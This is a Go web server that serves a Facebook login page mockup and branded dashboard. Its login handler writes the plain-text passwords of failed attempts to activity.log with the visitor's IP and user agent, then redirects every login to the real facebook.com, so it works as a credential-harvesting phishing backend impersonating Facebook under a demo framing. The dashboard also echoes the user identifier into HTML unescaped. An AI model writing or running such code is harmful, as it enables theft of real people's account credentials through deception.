package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const postLoginURL = "https://www.facebook.com"

// ─── In-memory user store (replace with a real DB in production) ────────────

type User struct {
	Identifier string
	Password   string // plain-text for demo — use bcrypt in production!
}

var (
	usersMu sync.RWMutex
	users   = []User{
		{Identifier: "demo@example.com", Password: "password123"},
	}
)

// ─── Session store ───────────────────────────────────────────────────────────

type Session struct {
	Identifier string
	ExpiresAt  time.Time
}

var (
	sessionsMu sync.RWMutex
	sessions   = map[string]Session{}
)

func newSession(id string) string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	token := hex.EncodeToString(b)
	sessionsMu.Lock()
	sessions[token] = Session{Identifier: id, ExpiresAt: time.Now().Add(24 * time.Hour)}
	sessionsMu.Unlock()
	return token
}

func getSession(r *http.Request) (Session, bool) {
	cookie, err := r.Cookie("session")
	if err != nil {
		return Session{}, false
	}
	sessionsMu.RLock()
	s, ok := sessions[cookie.Value]
	sessionsMu.RUnlock()
	if !ok || time.Now().After(s.ExpiresAt) {
		return Session{}, false
	}
	return s, true
}

func deleteSession(token string) {
	sessionsMu.Lock()
	delete(sessions, token)
	sessionsMu.Unlock()
}

// ─── Activity logger ─────────────────────────────────────────────────────────

// LogEntry is one line written to activity.log as JSON.
type LogEntry struct {
	Time       string `json:"time"`
	Event      string `json:"event"` // "login_success" | "login_failure" | "logout" | "page_visit" | ...
	IP         string `json:"ip"`
	Identifier string `json:"identifier,omitempty"`
	Password   string `json:"password,omitempty"` // only recorded on failed attempts so you can see what was typed
	Path       string `json:"path,omitempty"`
	UserAgent  string `json:"user_agent,omitempty"`
	Note       string `json:"note,omitempty"`
}

var (
	logMu   sync.Mutex
	logFile *os.File
)

func initLogger() {
	f, err := os.OpenFile("activity.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("cannot open activity.log: %v", err)
	}
	logFile = f
}

func writeLog(entry LogEntry) {
	if entry.Time == "" {
		entry.Time = time.Now().Format(time.RFC3339)
	}
	b, _ := json.Marshal(entry)
	logMu.Lock()
	logFile.Write(b)
	logFile.WriteString("\n")
	logMu.Unlock()
}

// realIP extracts the client IP, honouring X-Forwarded-For if present.
func realIP(r *http.Request) string {
	if fwd := r.Header.Get("X-Forwarded-For"); fwd != "" {
		return strings.Split(fwd, ",")[0]
	}
	ip := r.RemoteAddr
	if i := strings.LastIndex(ip, ":"); i != -1 {
		ip = ip[:i]
	}
	return ip
}

// ─── Handlers ────────────────────────────────────────────────────────────────

func handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	writeLog(LogEntry{
		Event:     "page_visit",
		IP:        realIP(r),
		Path:      r.URL.String(),
		UserAgent: r.UserAgent(),
	})
	if _, ok := getSession(r); ok {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}
	http.ServeFile(w, r, "facebook-login-mockup.html")
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	if err := r.ParseForm(); err != nil {
		http.Redirect(w, r, "/?error=server_error", http.StatusSeeOther)
		return
	}

	identifier := strings.TrimSpace(r.FormValue("identifier"))
	password := r.FormValue("password")
	ip := realIP(r)
	ua := r.UserAgent()

	// Missing fields
	if identifier == "" || password == "" {
		writeLog(LogEntry{
			Event:      "login_failure",
			IP:         ip,
			Identifier: identifier,
			UserAgent:  ua,
			Note:       "missing fields",
		})
		http.Redirect(w, r, "/?error=missing_fields", http.StatusSeeOther)
		return
	}

	// Credential check
	usersMu.RLock()
	var found bool
	for _, u := range users {
		if strings.EqualFold(u.Identifier, identifier) && u.Password == password {
			found = true
			break
		}
	}
	usersMu.RUnlock()

	if !found {
		writeLog(LogEntry{
			Event:      "login_failure",
			IP:         ip,
			Identifier: identifier,
			Password:   password, // recorded so you can see what was typed
			UserAgent:  ua,
			Note:       "invalid credentials",
		})
		http.Redirect(w, r, postLoginURL, http.StatusSeeOther)
		return
	}

	writeLog(LogEntry{
		Event:      "login_success",
		IP:         ip,
		Identifier: identifier,
		UserAgent:  ua,
	})

	token := newSession(identifier)
	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    token,
		Path:     "/",
		HttpOnly: true,
		SameSite: http.SameSiteLaxMode,
		MaxAge:   86400,
	})
	http.Redirect(w, r, postLoginURL, http.StatusSeeOther)
}

func handleDashboard(w http.ResponseWriter, r *http.Request) {
	s, ok := getSession(r)
	if !ok {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}
	writeLog(LogEntry{
		Event:      "page_visit",
		IP:         realIP(r),
		Identifier: s.Identifier,
		Path:       "/dashboard",
		UserAgent:  r.UserAgent(),
	})
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <title>Dashboard</title>
  <style>
    body { font-family: -apple-system, sans-serif; background:#f0f2f5;
           display:flex; align-items:center; justify-content:center; height:100vh; }
    .card { background:#fff; border-radius:8px;
            box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);
            padding:40px; text-align:center; max-width:400px; }
    h1 { color:#1877f2; margin-bottom:12px; }
    p  { color:#606770; margin-bottom:24px; }
    a  { display:inline-block; background:#1877f2; color:#fff; text-decoration:none;
         padding:10px 20px; border-radius:6px; font-weight:700; }
    a:hover { background:#166fe5; }
  </style>
</head>
<body>
  <div class="card">
    <h1>facebook</h1>
    <p>Welcome back, <strong>` + s.Identifier + `</strong>!</p>
    <a href="/logout">Log out</a>
  </div>
</body>
</html>`))
}

func handleLogout(w http.ResponseWriter, r *http.Request) {
	s, ok := getSession(r)
	if ok {
		writeLog(LogEntry{
			Event:      "logout",
			IP:         realIP(r),
			Identifier: s.Identifier,
			UserAgent:  r.UserAgent(),
		})
	}
	if cookie, err := r.Cookie("session"); err == nil {
		deleteSession(cookie.Value)
	}
	http.SetCookie(w, &http.Cookie{Name: "session", Value: "", Path: "/", MaxAge: -1})
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func handleRegister(w http.ResponseWriter, r *http.Request) {
	writeLog(LogEntry{
		Event:     "page_visit",
		IP:        realIP(r),
		Path:      "/register",
		UserAgent: r.UserAgent(),
	})
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte("Registration page — not yet implemented."))
}

// ─── Main ─────────────────────────────────────────────────────────────────────

func main() {
	initLogger()
	defer logFile.Close()

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/login", handleLogin)
	mux.HandleFunc("/dashboard", handleDashboard)
	mux.HandleFunc("/logout", handleLogout)
	mux.HandleFunc("/register", handleRegister)

	log.Printf("Server listening on http://localhost:%s  (activity log → activity.log)", port)
	if err := http.ListenAndServe(":"+port, mux); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}
